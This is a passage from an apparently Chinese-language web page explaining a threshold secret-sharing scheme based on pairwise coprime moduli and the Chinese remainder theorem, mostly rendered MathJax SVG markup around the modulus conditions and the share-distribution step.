569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(4645.3, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(5090, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(6428.7, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(6873.3, 0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520, -150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7867.6, 0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex" xmlns="http://www.w3.org/2000/svg" width="1.176ex" height="1.593ex" role="img" focusable="false" viewBox="0 -694 520 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>满足如下条件：</p>
<script type="math/tex; mode=display">d_1<d_2<\cdots<d_n</script><script type="math/tex; mode=display">(d_i,d_j)=1,(i\neq j)</script><script type="math/tex; mode=display">(d_i,q)=1,(i=1,2,\cdots,n)</script><script type="math/tex; mode=display">\prod_{i=1}^td_i>q\prod_{i=1}^{t-1}d_{n-i+1}</script><h2 id="秘密分发"><a href="#秘密分发" class="headerlink" title="秘密分发"></a>秘密分发</h2><p>令<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.777ex" xmlns="http://www.w3.org/2000/svg" width="12.459ex" height="2.858ex" role="img" focusable="false" viewBox="0 -919.7 5506.8 1263"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(1328.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munderover" transform="translate(2384.6, 0)"><g data-mml-node="mo"><path data-c="220F" d="M158 656Q147 684 131 694Q110 707 69 710H55V750H888V710H874Q840 708 820 698T795 678T786 656V-155Q798 -206 874 -210H888V-250H570V-210H584Q618 -208 638 -197T663 -178T673 -155V710H270V277L271 -155Q283 -206 359 -210H373V-250H55V-210H69Q103 -208 123 -197T148 -178T158 -155V656Z"></path></g><g data-mml-node="mi" transform="translate(944, 477.1) scale(0.707)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="TeXAtom" transform="translate(944, -285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1123, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="msub" transform="translate(4692.9, 0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，选择满足式<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.091ex" xmlns="http://www.w3.org/2000/svg" width="15.436ex" height="3.075ex" role="img" focusable="false" viewBox="0 -877 6822.7 1359.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(777.8, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(1833.6, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(2861.3, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mfrac" transform="translate(3917.1, 0)"><g data-mml-node="mi" transform="translate(220, 394) scale(0.707)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(429, -345) scale(0.707)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><rect width="943.2" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(5322.5, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(6322.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>的整数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="3.593ex" height="1.645ex" role="img" focusable="false" viewBox="0 -705 1588 727"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mi" transform="translate(828, 0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g></g></g></svg></mjx-container>计算：</p>
<script type="math/tex; mode=display">Z=S+Aq</script><script type="math/tex; mode=display">Z_i=Z\bmod d_i,i=1,2,\cdots,n</script><p>并将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.818ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3013.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389, 0)"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(683, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1366, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1810.6, 0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2624.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>作为秘密份额发给成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="18.348ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8109.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(936, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(1380.6, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1769.6, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2392.4, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3448.2, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3948.2, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(4392.8, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(4892.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(5337.5, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(6676.2, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(7120.8, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 